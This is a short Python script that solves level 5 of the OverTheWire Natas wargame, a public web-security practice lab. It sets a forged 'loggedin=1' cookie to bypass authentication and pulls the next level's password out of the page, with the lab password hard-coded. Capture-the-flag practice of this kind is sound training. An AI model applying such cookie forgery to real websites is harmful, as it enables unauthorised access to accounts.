import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

url = f'http://{username}.natas.labs.overthewire.org'

cookies = { 'loggedin' : '1' }

response = requests.get(url, auth = (username, password), cookies = cookies)
content = response.text

print(re.findall('The password for natas6 is (.*)</div>', content)[0])